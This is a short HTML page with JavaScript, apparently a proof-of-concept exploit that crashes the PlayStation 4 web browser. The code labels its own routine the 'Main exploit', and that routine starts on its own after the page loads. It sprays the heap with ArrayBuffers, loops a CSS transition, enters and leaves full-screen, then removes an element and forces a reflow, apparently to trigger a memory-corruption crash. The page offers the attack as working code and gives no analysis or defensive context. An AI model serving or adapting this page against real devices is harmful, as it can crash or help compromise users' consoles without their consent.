<!DOCTYPE html>
<html>
<head>
  <title>PS4 Full-Screen Crash (Stabilized)</title>
  <style>
    #box { 
      width: 100px; height: 100px; 
      background: red; 
      transition: transform 0.5s linear; 
      position: absolute; 
      left: 0; top: 50%; 
    }
    #status {
      font-family: Arial;
      color: white;
      background: black;
      padding: 10px;
      position: fixed;
      top: 0;
      left: 0;
      z-index: 9999;
    }
  </style>
</head>
<body style="background: #000; height: 200vh;">
  <div id="box"></div>
  <div id="status">Test running... Crash in 3 seconds.</div>

  <script>
    const box = document.getElementById('box');
    const status = document.getElementById('status');

    // Lightweight heap spray
    function heapSpray() {
      window.spray = [];
      for (let i = 0; i < 200; i++) {
        window.spray.push(new ArrayBuffer(0x200));
      }
    }

    // Main exploit
    function triggerExploit() {
      heapSpray();
      
      // Start transition loop
      setInterval(() => {
        box.style.transform = 'translateX(0)';
        setTimeout(() => box.style.transform = 'translateX(300px)', 10);
      }, 1000);

      // Enter/exit full-screen with longer delays
      setTimeout(() => {
        status.textContent = "Entering full-screen...";
        document.documentElement.requestFullscreen()
          .then(() => {
            setTimeout(() => {
              status.textContent = "Exiting full-screen... CRASH IMMINENT!";
              document.exitFullscreen();
              setTimeout(() => {
                box.remove();
                document.body.offsetHeight;
              }, 200);
            }, 300);
          })
          .catch(e => status.textContent = "Fullscreen failed: " + e);
      }, 3000);
    }

    // Start automatically
    setTimeout(triggerExploit, 1000);
  </script>
</body>
</html>
